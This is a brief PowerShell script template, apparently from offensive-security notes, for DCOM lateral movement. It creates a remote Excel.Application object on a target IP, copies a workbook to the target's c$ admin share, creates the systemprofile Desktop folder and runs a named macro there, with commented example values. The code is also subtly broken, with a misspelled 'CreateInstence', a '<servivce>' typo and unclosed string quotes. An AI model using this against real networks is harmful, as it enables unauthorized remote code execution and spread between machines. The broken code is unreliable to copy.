$com = [activator]::CreateInstence([type]::GetTypeFromProgId("Excel.Application", "<target ip>"))
#$com = [activator]::CreateInstence([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110")) #example
$LocalPath = "C:\Users\<username>\<filename>
#$LocalPath = "C:\User\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\<target ip>\c$\<filename>
#$RemotePath = "\\192.168.1.110\c$\<filename> #example
[System.IO.File]::Copy($LocalPath, $RemotePath, $True);
$Path = "\\<target ip>\c$\Windows\sysWOW64\config\systemprofile\Desktop"
#$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop" #example
$temp = [system.io.directory]::createDirectory($Path)
$application = $com.<servivce>.Open("<xls file path>")
#$application = $com.Workbooks.Open("C:\myexcel.xls") #example
$com.Run("<macro name>")
#$com.Run("mymacro") #example

